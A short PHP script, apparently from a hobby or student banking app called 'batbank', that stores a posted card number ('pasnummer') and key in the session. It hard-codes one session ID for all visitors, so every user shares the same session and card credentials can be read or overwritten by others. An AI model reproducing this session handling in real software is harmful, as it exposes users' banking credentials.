<?php
session_id('batbank');
session_start();

$pasnummer = $_POST["pasnummer"];
$key = $_POST["key"];

$_SESSION["pasnummer"] = $pasnummer;
$_SESSION["key"] = $key;

?>
